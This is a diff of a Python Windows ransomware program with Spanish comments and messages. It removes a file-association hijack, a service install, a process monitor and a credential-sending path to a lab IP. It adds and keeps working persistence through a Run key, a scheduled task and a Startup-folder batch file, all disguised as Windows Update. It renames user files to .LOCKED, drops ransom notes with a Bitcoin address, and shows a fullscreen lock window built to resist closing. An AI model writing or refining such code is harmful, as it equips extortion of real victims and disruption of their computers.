@@ -2,7 +2,6 @@ import os
 import sys
 import random
 import string
-import requests
 import time
 import subprocess
 import ctypes
@@ -12,7 +11,6 @@ import getpass
 from pathlib import Path
 import tkinter as tk
 from tkinter import messagebox
-import psutil
 
 class RansomwarePersistente:
     def __init__(self):
@@ -20,24 +18,19 @@ class RansomwarePersistente:
             '~/Documents',
             '~/Downloads', 
             '~/Desktop',
-            '~/Pictures',
-            '~/Videos',
-            '~/Music'
+            '~/Pictures'
         ]
         self.excluded_dirs = [
             'Windows', 'Program Files', 'Program Files (x86)',
             'System32', 'Windows.old', 'Recovery', '$Recycle.Bin'
         ]
-        self.kali_ip = "10.0.2.20"
         self.bitcoin = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'
         self.price = 500
-        self.url = f'http://{self.kali_ip}/victima.php'
         self.encryption_count = 0
         self.password = None
         self.victim_id = None
         self.script_path = os.path.abspath(__file__)
         self.window_open = False
-        self.current_window = None
         
     def is_admin(self):
         try:
@@ -54,23 +47,6 @@ class RansomwarePersistente:
 ██║   ██║██╔══██╗██╔══╝  ██╔══██╗   ██║   ██║██║╚██╗██║██║   ██║
 ╚██████╔╝██║  ██║███████╗██║  ██║   ██║   ██║██║ ╚████║╚██████╔╝
  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
-                                                                 
- _nnnn_                      
-dGGGGMMb     ,\"\"\"\"\"\"\"\"\"\"\"\"\".
-@p~qp~~qMb    | Linux Rules! |
-M|@||@) M|   _;..............'
-|,----.JM| -'
-JS^\\__/  qKL
-dZP        qKRb
-dZP          qKKb
-fZP            SMMb
-HZM            MMMM
-FqM            MMMM
-__| \".        |\\dS\"qML
-|    `.       | `' \\Zq
-_)      \\.___.,|     .'
-\\____   )MMMMMP|   .'
-     `-'       `--' hjm
 ==================================================
         TU INFORMACION HA SIDO SECUESTRADA
 ==================================================
@@ -87,12 +63,6 @@ _)      \\.___.,|     .'
             self._install_scheduled_task()
             # Metodo 3: Carpeta Startup
             self._install_startup_folder()
-            # Metodo 4: Servicio de Windows (si es admin)
-            if self.is_admin():
-                self._install_windows_service()
-            
-            # Metodo 5: File association hijacking
-            self._install_file_association()
             
             print("[+] Persistencia instalada correctamente")
             return True
@@ -100,98 +70,31 @@ _)      \\.___.,|     .'
             print("[-] Error instalando persistencia:", e)
             return False
 
-    def _install_file_association(self):
-        """Hijack de asociaciones de archivos para mostrar ventana ransomware"""
-        try:
-            # Extensiones comunes a hijack
-            extensions = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', 
-                         '.mp3', '.mp4', '.xls', '.xlsx', '.zip', '.rar']
-            
-            for ext in extensions:
-                try:
-                    # Crear asociación que ejecute nuestro script
-                    key_path = f"{ext}\\shell\\open\\command"
-                    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, f"Software\\Classes\\{key_path}") as key:
-                        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{sys.executable}" "{self.script_path}" "%1"')
-                except:
-                    pass
-                    
-            print(" [+] Hijack de asociaciones de archivos instalado")
-        except Exception as e:
-            print(" [-] Error en hijack de archivos:", e)
-
     def _install_registry_persistence(self):
         """Instala persistencia en el registro de Windows"""
         try:
-            # Current User Run
             key = winreg.HKEY_CURRENT_USER
             subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
             with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
-                winreg.SetValueEx(reg_key, "WindowsUpdateService", 0, winreg.REG_SZ, f'"{sys.executable}" "{self.script_path}"')
-            print(" [+] Persistencia en registro (HKCU) instalada")
+                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, f'"{sys.executable}" "{self.script_path}"')
+            print(" [+] Persistencia en registro instalada")
         except Exception as e:
-            print(" [-] Error en registro HKCU:", e)
+            print(" [-] Error en registro:", e)
 
     def _install_scheduled_task(self):
         """Crea una tarea programada"""
         try:
-            task_name = "WindowsDefenderUpdate"
-            task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo>
-    <Description>Windows Defender Update Service</Description>
-  </RegistrationInfo>
-  <Triggers>
-    <LogonTrigger>
-      <Enabled>true</Enabled>
-    </LogonTrigger>
-    <BootTrigger>
-      <Enabled>true</Enabled>
-    </BootTrigger>
-  </Triggers>
-  <Principals>
-    <Principal id="Author">
-      <UserId>{getpass.getuser()}</UserId>
-      <LogonType>InteractiveToken</LogonType>
-    </Principal>
-  </Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>false</AllowHardTerminate>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-    <IdleSettings>
-      <StopOnIdleEnd>false</StopOnIdleEnd>
-      <RestartOnIdle>false</RestartOnIdle>
-    </IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>true</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Priority>7</Priority>
-  </Settings>
-  <Actions Context="Author">
-    <Exec>
-      <Command>"{sys.executable}"</Command>
-      <Arguments>"{self.script_path}"</Arguments>
-    </Exec>
-  </Actions>
-</Task>'''
-            # Guardar XML temporalmente
-            xml_path = os.path.join(os.getenv('TEMP'), 'task.xml')
-            with open(xml_path, 'w') as f:
-                f.write(task_xml)
-            # Crear tarea
-            subprocess.run([
-                'schtasks', '/create', '/tn', task_name, '/xml', xml_path, '/f'
-            ], capture_output=True, shell=True)
-            # Limpiar
-            os.remove(xml_path)
-            print(" [+] Tarea programada instalada")
+            task_name = "WindowsUpdateTask"
+            cmd = [
+                'schtasks', '/create', '/tn', task_name, 
+                '/tr', f'"{sys.executable}" "{self.script_path}"',
+                '/sc', 'onlogon', '/f'
+            ]
+            result = subprocess.run(cmd, capture_output=True, shell=True)
+            if result.returncode == 0:
+                print(" [+] Tarea programada instalada")
+            else:
+                print(" [-] Error instalando tarea programada")
         except Exception as e:
             print(" [-] Error en tarea programada:", e)
 
@@ -203,206 +106,194 @@ _)      \\.___.,|     .'
                 'AppData', 'Roaming', 'Microsoft', 'Windows',
                 'Start Menu', 'Programs', 'Startup'
             )
-            if os.path.exists(startup_folder):
-                bat_content = f'@echo off\n"{sys.executable}" "{self.script_path}"\n'
-                bat_path = os.path.join(startup_folder, 'WindowsUpdate.bat')
-                with open(bat_path, 'w') as f:
-                    f.write(bat_content)
-                # Ocultar archivo
-                subprocess.run(f'attrib +h "{bat_path}"', shell=True, capture_output=True)
-                print(" [+] Persistencia en carpeta Startup instalada")
+            if not os.path.exists(startup_folder):
+                os.makedirs(startup_folder, exist_ok=True)
+            
+            bat_content = f'@echo off\n"{sys.executable}" "{self.script_path}"\n'
+            bat_path = os.path.join(startup_folder, 'WindowsUpdate.bat')
+            with open(bat_path, 'w') as f:
+                f.write(bat_content)
+            print(" [+] Persistencia en carpeta Startup instalada")
         except Exception as e:
             print(" [-] Error en carpeta Startup:", e)
 
-    def _install_windows_service(self):
-        """Instala como servicio de Windows (requiere admin)"""
+    def check_persistence(self):
+        """Verifica si ya hay persistencia instalada"""
         try:
-            service_name = "WindowsDefenderUpdate"
-            # Usar sc para crear el servicio
-            subprocess.run([
-                'sc', 'create', service_name,
-                f'binpath= "{sys.executable} {self.script_path}"',
-                'start= auto',
-                'displayname= "Windows Defender Update Service"'
-            ], capture_output=True, shell=True)
-            print(" [+] Servicio de Windows instalado")
-        except Exception as e:
-            print(" [-] Error instalando servicio:", e)
-
-    def start_file_monitor(self):
-        """Inicia el monitoreo de apertura de archivos"""
-        def monitor():
-            while True:
+            # Verificar registro
+            key = winreg.HKEY_CURRENT_USER
+            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_READ) as reg_key:
                 try:
-                    # Verificar procesos recién abiertos
-                    for proc in psutil.process_iter(['name', 'create_time']):
-                        try:
-                            proc_name = proc.info['name'].lower()
-                            # Si se abre un programa común, mostrar ventana ransomware
-                            if any(app in proc_name for app in ['notepad', 'word', 'excel', 'powerpnt', 
-                                                              'acrobat', 'photoshop', 'winword', 'excel',
-                                                              'mspaint', 'calculator', 'chrome', 'firefox',
-                                                              'edge', 'explorer']):
-                                if not self.window_open:
-                                    self.show_ransomware_window()
-                        except:
-                            pass
-                    time.sleep(2)
-                except:
+                    value, _ = winreg.QueryValueEx(reg_key, "WindowsUpdate")
+                    if os.path.abspath(__file__) in value:
+                        return True
+                except FileNotFoundError:
                     pass
-        
-        monitor_thread = threading.Thread(target=monitor, daemon=True)
-        monitor_thread.start()
+            return False
+        except:
+            return False
+
+    def expand_paths(self):
+        expanded_dirs = []
+        for directory in self.directories_to_encrypt:
+            expanded_path = os.path.expanduser(directory)
+            if os.path.exists(expanded_path):
+                expanded_dirs.append(expanded_path)
+        return expanded_dirs if expanded_dirs else ['.']
+
+    def should_encrypt(self, filepath):
+        file_str = str(filepath).lower()
+        for excluded in self.excluded_dirs:
+            if excluded.lower() in file_str:
+                return False
+        try:
+            if filepath.stat().st_size < 100:
+                return False
+        except:
+            return False
+        valid_extensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.jpg', '.jpeg', '.png']
+        return any(file_str.endswith(ext) for ext in valid_extensions)
+
+    def generate_keys(self):
+        s = string.ascii_lowercase + string.digits + string.ascii_uppercase
+        self.password = ''.join(random.sample(s, 20))
+        self.victim_id = ''.join(random.sample(string.ascii_lowercase + string.digits, 8))
+
+    def encrypt_file(self, filepath):
+        try:
+            if not self.should_encrypt(filepath):
+                return False
+            new_name = str(filepath) + '.LOCKED'
+            os.rename(filepath, new_name)
+            self.encryption_count += 1
+            return True
+        except:
+            return False
+
+    def encrypt_directory(self, directory):
+        encrypted_files = 0
+        try:
+            for root, dirs, files in os.walk(directory):
+                # Excluir directorios del sistema
+                dirs[:] = [d for d in dirs if not any(excl.lower() in os.path.join(root, d).lower() for excl in self.excluded_dirs)]
+                for file in files:
+                    filepath = Path(root) / file
+                    if self.encrypt_file(filepath):
+                        encrypted_files += 1
+            return encrypted_files
+        except Exception as e:
+            print(f"Error cifrando directorio {directory}: {e}")
+            return 0
+
+    def create_ransom_note(self):
+        note = f"""
+================================================================
+!!! SISTEMA BLOQUEADO !!!
+================================================================
+TU INFORMACION HA SIDO SECUESTRADA
+
+INFORMACION PARA LA RECUPERACION:
+* ID Unico: {self.victim_id}
+* Pago Requerido: ${self.price} en Bitcoin
+* Direccion Bitcoin: {self.bitcoin}
+
+ADVERTENCIAS:
+* NO REINICIE EL SISTEMA
+* NO REINSTALE EL SISTEMA
+* NO INTENTE DESCIFRAR LOS ARCHIVOS MANUALMENTE
+
+Para recuperar sus archivos, ingrese la clave de descifrado:
+"""
+        locations = [
+            os.path.expanduser('~/Desktop/LEAME_URGENTE.txt'),
+            os.path.expanduser('~/Documents/INSTRUCCIONES.txt')
+        ]
+        for location in locations:
+            try:
+                with open(location, 'w', encoding='utf-8') as f:
+                    f.write(note)
+                print("[+] Nota de rescate creada en: " + location)
+            except:
+                pass
 
     def show_ransomware_window(self):
-        """Muestra la ventana de ransomware estilo WannaCry con fondo negro"""
+        """Muestra la ventana de ransomware con fondo negro"""
         if self.window_open:
             return
             
         try:
             self.window_open = True
             root = tk.Tk()
-            self.current_window = root
             root.title("!!! WARNING !!!")
             root.attributes("-topmost", True)
             root.configure(bg="black")
             root.attributes("-fullscreen", True)
             
-            # Bindear teclas para prevenir escape
+            # Prevenir cierre
+            root.protocol("WM_DELETE_WINDOW", lambda: None)
             root.bind("<Escape>", lambda e: "break")
             root.bind("<Alt-F4>", lambda e: "break")
-            root.bind("<Super_L>", lambda e: "break")
-            root.bind("<Super_R>", lambda e: "break")
             
-            # Frame principal con fondo negro
+            # Frame principal
             main_frame = tk.Frame(root, bg="black")
             main_frame.pack(fill="both", expand=True, padx=50, pady=50)
             
-            # Arte ASCII en rojo
-            ascii_frame = tk.Frame(main_frame, bg="black")
-            ascii_frame.pack(fill="x", pady=20)
-            
-            ascii_art = """
- ██████╗ ██████╗ ███████╗██████╗ ████████╗██╗███╗   ██╗ ██████╗ 
-██╔═══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║████╗  ██║██╔════╝ 
-██║   ██║██████╔╝█████╗  ██████╔╝   ██║   ██║██╔██╗ ██║██║  ███╗
-██║   ██║██╔══██╗██╔══╝  ██╔══██╗   ██║   ██║██║╚██╗██║██║   ██║
-╚██████╔╝██║  ██║███████╗██║  ██║   ██║   ██║██║ ╚████║╚██████╔╝
- ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
-                                                                 
- _nnnn_                      
-dGGGGMMb     ,\"\"\"\"\"\"\"\"\"\"\"\"\".
-@p~qp~~qMb    | Linux Rules! |
-M|@||@) M|   _;..............'
-|,----.JM| -'
-JS^\\__/  qKL
-dZP        qKRb
-dZP          qKKb
-fZP            SMMb
-HZM            MMMM
-FqM            MMMM
-__| \".        |\\dS\"qML
-|    `.       | `' \\Zq
-_)      \\.___.,|     .'
-\\____   )MMMMMP|   .'
-     `-'       `--' hjm
-"""
-            ascii_label = tk.Label(
-                ascii_frame,
-                text=ascii_art,
-                font=("Courier New", 8),
+            # Título
+            title_label = tk.Label(
+                main_frame,
+                text="¡TU SISTEMA HA SIDO SECUESTRADO!",
+                font=("Arial", 24, "bold"),
                 fg="red",
-                bg="black",
-                justify="left"
-            )
-            ascii_label.pack()
-            
-            # Mensaje principal
-            message_frame = tk.Frame(main_frame, bg="black")
-            message_frame.pack(fill="x", pady=20)
-            
-            main_message = tk.Label(
-                message_frame,
-                text="¡TU SISTEMA HA SIDO SECUESTRADO!\nTODOS TUS ARCHIVOS HAN SIDO CIFRADOS",
-                font=("Arial", 16, "bold"),
-                fg="red",
-                bg="black",
-                justify="center"
-            )
-            main_message.pack(pady=10)
-            
-            # Información de rescate
-            info_frame = tk.Frame(main_frame, bg="black")
-            info_frame.pack(fill="x", pady=15)
-            
-            # ID único
-            id_label = tk.Label(
-                info_frame,
-                text=f"ID ÚNICO: {self.victim_id}",
-                font=("Arial", 12, "bold"),
-                fg="yellow",
                 bg="black"
             )
-            id_label.pack()
+            title_label.pack(pady=20)
             
-            # Precio
-            price_label = tk.Label(
-                info_frame,
-                text=f"RESCATE: ${self.price} USD EN BITCOIN",
-                font=("Arial", 12, "bold"),
-                fg="yellow",
-                bg="black"
-            )
-            price_label.pack(pady=5)
-            
-            # Dirección Bitcoin
-            btc_frame = tk.Frame(main_frame, bg="black")
-            btc_frame.pack(fill="x", pady=10)
-            
-            btc_label = tk.Label(
-                btc_frame,
-                text=f"BITCOIN: {self.bitcoin}",
-                font=("Courier New", 10),
-                fg="cyan",
-                bg="black"
-            )
-            btc_label.pack()
-            
-            # Frame de entrada de clave
-            input_frame = tk.Frame(main_frame, bg="black")
-            input_frame.pack(fill="x", pady=20)
-            
-            input_label = tk.Label(
-                input_frame,
-                text="INGRESE LA CLAVE DE DESCIFRADO:",
-                font=("Arial", 12, "bold"),
+            # Mensaje
+            message_label = tk.Label(
+                main_frame,
+                text="Todos tus archivos han sido cifrados.\nPara recuperarlos debes pagar el rescate.",
+                font=("Arial", 16),
                 fg="white",
                 bg="black"
             )
-            input_label.pack(pady=10)
+            message_label.pack(pady=10)
+            
+            # Información
+            info_text = f"""
+ID VÍCTIMA: {self.victim_id}
+RESCATE: ${self.price} USD
+BITCOIN: {self.bitcoin}
+
+Ingrese la clave de descifrado si ya ha pagado:
+"""
+            info_label = tk.Label(
+                main_frame,
+                text=info_text,
+                font=("Arial", 12),
+                fg="yellow",
+                bg="black",
+                justify="left"
+            )
+            info_label.pack(pady=20)
             
             # Entrada de clave
             self.password_var = tk.StringVar()
             password_entry = tk.Entry(
-                input_frame,
+                main_frame,
                 textvariable=self.password_var,
                 font=("Arial", 14),
                 width=40,
                 show="*",
-                relief="solid",
-                bd=3,
                 bg="white",
                 fg="black"
             )
             password_entry.pack(pady=10)
             password_entry.focus()
             
-            # Botones
-            button_frame = tk.Frame(main_frame, bg="black")
-            button_frame.pack(fill="x", pady=15)
-            
+            # Botón de verificación
             verify_btn = tk.Button(
-                button_frame,
+                main_frame,
                 text="VERIFICAR CLAVE",
                 font=("Arial", 12, "bold"),
                 bg="red",
@@ -411,44 +302,20 @@ _)      \\.___.,|     .'
                 width=20,
                 height=2
             )
-            verify_btn.pack()
+            verify_btn.pack(pady=20)
             
-            # Advertencias
-            warning_frame = tk.Frame(main_frame, bg="black")
-            warning_frame.pack(fill="x", pady=10)
-            
-            warnings = tk.Label(
-                warning_frame,
-                text="ADVERTENCIA: NO CIERRE ESTA VENTANA - NO REINICIE EL SISTEMA\nLOS ARCHIVOS SE PERDERÁN PERMANENTEMENTE SI NO PAGA EL RESCATE",
+            # Advertencia
+            warning_label = tk.Label(
+                main_frame,
+                text="ADVERTENCIA: No cierre esta ventana. El sistema se reiniciará automáticamente.",
                 font=("Arial", 10),
                 fg="orange",
-                bg="black",
-                justify="center"
-            )
-            warnings.pack()
-            
-            # Tiempo transcurrido
-            self.counter = 0
-            time_frame = tk.Frame(main_frame, bg="black")
-            time_frame.pack(fill="x", pady=5)
-            
-            self.time_label = tk.Label(
-                time_frame,
-                text="TIEMPO BLOQUEADO: 0 SEGUNDOS",
-                font=("Arial", 10),
-                fg="gray",
                 bg="black"
             )
-            self.time_label.pack()
+            warning_label.pack(pady=10)
             
-            # Iniciar contador
-            self.update_counter(root)
-            
-            # Vincular Enter a verificación
+            # Vincular Enter
             password_entry.bind('<Return>', lambda e: self.verify_decryption_key(root))
-            
-            # Iniciar monitoreo de cierre
-            self.monitor_window_close(root)
             
             root.mainloop()
             
@@ -456,37 +323,17 @@ _)      \\.___.,|     .'
             print(f"Error mostrando ventana: {e}")
             self.window_open = False
 
-    def monitor_window_close(self, root):
-        """Monitorea si la ventana se cierra y la reabre"""
-        def check_window():
-            try:
-                root.winfo_exists()
-                root.after(1000, check_window)
-            except:
-                self.window_open = False
-                # Reabrir ventana después de 2 segundos
-                threading.Timer(2, self.show_ransomware_window).start()
-                
-        root.after(1000, check_window)
-
     def verify_decryption_key(self, root):
         """Verifica si la clave de descifrado es correcta"""
         entered_password = self.password_var.get()
         if entered_password == self.password:
-            messagebox.showinfo("ÉXITO", "Clave correcta! Iniciando proceso de descifrado...")
+            messagebox.showinfo("ÉXITO", "Clave correcta! Iniciando descifrado...")
             root.destroy()
             self.window_open = False
             self.start_decryption()
         else:
-            messagebox.showerror("ERROR", "Clave incorrecta. El sistema permanece bloqueado.")
+            messagebox.showerror("ERROR", "Clave incorrecta. Sistema bloqueado.")
             self.password_var.set("")
-
-    def update_counter(self, root):
-        """Actualiza el contador de tiempo"""
-        self.counter += 1
-        if hasattr(self, 'time_label'):
-            self.time_label.config(text=f"TIEMPO BLOQUEADO: {self.counter} SEGUNDOS")
-        root.after(1000, lambda: self.update_counter(root))
 
     def start_decryption(self):
         """Inicia el proceso de descifrado"""
@@ -495,15 +342,9 @@ _)      \\.___.,|     .'
 import os
 import winreg
 import subprocess
-import sys
-
-VICTIM_ID = "{self.victim_id}"
-PASSWORD = "{self.password}"
 
 def main():
-    print("Sistema de Recuperación de Archivos")
-    print("===================================")
-    print(f"ID de víctima: {{VICTIM_ID}}")
+    print("Descifrando archivos...")
     
     # Descifrar archivos
     encrypted_files = []
@@ -518,40 +359,42 @@ def main():
             original_file = enc_file[:-7]  # Remover .LOCKED
             os.rename(enc_file, original_file)
             success_count += 1
-            print(f"[+] Recuperado: {{os.path.basename(original_file)}}")
+            print(f"Recuperado: {{os.path.basename(original_file)}}")
         except Exception as e:
-            print(f"[-] Error con {{os.path.basename(enc_file)}}: {{e}}")
+            print(f"Error con {{os.path.basename(enc_file)}}: {{e}}")
     
     # Remover persistencia
-    print("\\n[*] Removiendo persistencia...")
+    print("Removiendo persistencia...")
     try:
-        # Remover del registro
+        # Registro
         key = winreg.HKEY_CURRENT_USER
         subkey = r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
         with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
             try:
-                winreg.DeleteValue(reg_key, "WindowsUpdateService")
-                print("[+] Persistencia del registro removida")
+                winreg.DeleteValue(reg_key, "WindowsUpdate")
+                print("Persistencia del registro removida")
             except:
                 pass
         
-        # Remover tarea programada
-        os.system('schtasks /delete /tn "WindowsDefenderUpdate" /f 2>nul')
-        print("[+] Tarea programada removida")
+        # Tarea programada
+        os.system('schtasks /delete /tn "WindowsUpdateTask" /f 2>nul')
+        print("Tarea programada removida")
         
-        # Remover archivos temporales
-        files_to_remove = ["LEAME_URGENTE.txt", "INSTRUCCIONES.txt", "CREDENCIALES_LOCALES.txt"]
-        for file in files_to_remove:
-            if os.path.exists(file):
-                os.remove(file)
-                print(f"[+] Archivo {{file}} removido")
+        # Startup
+        startup_folder = os.path.join(
+            os.path.expanduser("~"),
+            'AppData', 'Roaming', 'Microsoft', 'Windows',
+            'Start Menu', 'Programs', 'Startup'
+        )
+        bat_path = os.path.join(startup_folder, 'WindowsUpdate.bat')
+        if os.path.exists(bat_path):
+            os.remove(bat_path)
+            print("Archivo de startup removido")
                 
     except Exception as e:
-        print(f"[-] Error removiendo persistencia: {{e}}")
+        print(f"Error removiendo persistencia: {{e}}")
     
-    print(f"\\n[+] Proceso completado!")
-    print(f"[*] Archivos recuperados: {{success_count}}/{{len(encrypted_files)}}")
-    print("\\n[+] Sistema completamente recuperado y limpio!")
+    print(f"Proceso completado! Archivos recuperados: {{success_count}}")
     input("Presione Enter para salir...")
 
 if __name__ == "__main__":
@@ -561,83 +404,51 @@ if __name__ == "__main__":
                 f.write(decrypt_script)
                 
             subprocess.Popen([sys.executable, 'DECRYPT_FILES.py'])
+            
         except Exception as e:
-            messagebox.showerror("Error", f"No se pudo iniciar el descifrado: {e}")
+            print(f"Error iniciando descifrado: {e}")
 
-    # ... (mantén los otros métodos igual: check_persistence, expand_paths, should_encrypt, 
-    # generate_keys, test_connection, send_credentials, save_credentials_local,
-    # encrypt_file_windows, encrypt_directory, create_ransom_note, kill_system_tools,
-    # disable_task_manager)
-
-    def execute_complete_lockdown(self):
-        """Ejecuta el bloqueo completo del sistema"""
+    def execute_ransomware(self):
+        """Ejecuta el ransomware completo"""
         self.show_banner()
-        print("[*] INICIANDO BLOQUEO COMPLETO PERSISTENTE")
-        print("=" * 50)
+        print("[*] INICIANDO RANSOMWARE")
+        print("=" * 40)
         
-        # Verificar si ya está instalado
-        if self.check_persistence():
-            print("[*] El ransomware ya está instalado en el sistema")
-            print("[*] Activando modo de ejecución persistente...")
-        else:
-            # Instalar persistencia en la primera ejecución
+        # Verificar persistencia
+        if not self.check_persistence():
             print("[*] Instalando persistencia...")
             self.install_persistence()
+        else:
+            print("[*] Persistencia ya instalada")
 
-        # Paso 1: Configurar conexión
-        print("\\n[1/5] Configurando conexión...")
-        connection_ok = self.test_connection()
-        
-        # Continuar automáticamente sin conexión
-        if not connection_ok:
-            print("[*] Continuando sin conexión al servidor...")
-
-        # Paso 2: Generar claves
-        print("\\n[2/5] Generando claves...")
+        # Generar claves
+        print("[*] Generando claves...")
         self.generate_keys()
 
-        # Paso 3: Enviar credenciales
-        if connection_ok:
-            print("\\n[3/5] Enviando credenciales...")
-            self.send_credentials()
-        else:
-            print("\\n[3/5] Guardando credenciales localmente...")
-            self.save_credentials_local()
-
-        # Paso 4: Cifrar archivos
-        print("\\n[4/5] Cifrando archivos...")
+        # Cifrar archivos
+        print("[*] Cifrando archivos...")
         directories = self.expand_paths()
         total_encrypted = 0
         for directory in directories:
             encrypted = self.encrypt_directory(directory)
             total_encrypted += encrypted
-            print(" " + directory + ": " + str(encrypted) + " archivos")
+            print(f" {directory}: {encrypted} archivos")
 
-        # Paso 5: Bloquear sistema y monitorear
-        print("\\n[5/5] Activando bloqueo completo...")
+        # Crear nota de rescate
+        print("[*] Creando nota de rescate...")
         self.create_ransom_note()
-        self.kill_system_tools()
-        self.disable_task_manager()
+
+        print(f"[+] COMPLETADO: {total_encrypted} archivos cifrados")
+        print(f"[+] CLAVE: {self.password}")
         
-        print("[+] SISTEMA BLOQUEADO PERSISTENTEMENTE")
-        print("[*] Archivos cifrados: " + str(total_encrypted))
-        print("[*] Clave: " + self.password)
-        
-        # Iniciar monitoreo de archivos
-        self.start_file_monitor()
-        
-        # Mostrar ventana principal inmediatamente
+        # Mostrar ventana
+        print("[*] Mostrando ventana de ransomware...")
         self.show_ransomware_window()
-        
-        # Mantener el script corriendo
-        while True:
-            time.sleep(10)
 
 if __name__ == "__main__":
-    ransomware = RansomwarePersistente()
     try:
-        ransomware.execute_complete_lockdown()
-    except KeyboardInterrupt:
-        print("\\n[*] Ejecución interrumpida")
+        ransomware = RansomwarePersistente()
+        ransomware.execute_ransomware()
     except Exception as e:
-        print("\\n[-] Error:", e)
+        print(f"Error: {e}")
+        input("Presione Enter para salir...")
